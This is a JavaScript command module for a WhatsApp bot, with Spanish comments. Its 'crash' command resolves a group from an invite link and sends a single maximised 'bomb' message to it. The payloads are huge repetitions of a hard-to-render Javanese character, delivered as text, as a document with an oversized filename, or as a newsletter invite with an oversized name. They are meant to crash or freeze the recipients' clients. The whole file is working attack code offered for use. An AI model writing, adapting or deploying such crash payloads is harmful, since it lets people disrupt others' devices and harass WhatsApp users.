export default {
  name: ["crash"],
  description: "Traba de un solo mensaje: bomba de payload máximo",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Pásame el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });

    // Arma opcional: .crash <link> [texto|doc|canal]
    const tipo = (text.trim().split(/\s+/)[1] || 'canal').toLowerCase();

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(match[1])).id;
    } catch {
      return reply({ text: '⚠️ No se pudo obtener el ID del grupo. Revisa el enlace.' });
    }

    // Carácter más caro de renderizar (cámbialo si quieres probar otro)
    const CHAR = 'ꦾ';                     // javanés
    // Alternativas pesadas: '𑇂𑆵𑆴𑆿' (astral)  |  '👨👩👧👦' (ZWJ)

    const BOMB  = CHAR.repeat(65000);     // payload de texto máximo
    const NOMBRE = CHAR.repeat(90000).repeat(5); // ~450k chars sin tope real

    const THUMB = Buffer.from(
      '/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==',
      'base64'
    );

    // Cada arma = UN solo mensaje, pero maxeado
    const armas = {
      texto: () => sock.sendMessage(groupId, { text: BOMB }),

      doc: () => sock.sendMessage(groupId, {
        document: Buffer.from('\u200E'.repeat(8000)),
        fileName: CHAR.repeat(255),
        mimetype: 'application/msword',
        caption: BOMB,
      }),

      canal: () => sock.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363229729656123@newsletter',
          newsletterName: 'ADOi' + NOMBRE,
          jpegThumbnail: THUMB,
          caption: BOMB,
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`,
        },
      }, {}),
    };

    const arma = armas[tipo] || armas.canal;

    const t = Date.now();
    await arma();
    await reply({ text: `💥 Bomba *${tipo}* lanzada a ${groupId} · ${Date.now() - t} ms` });
  },
};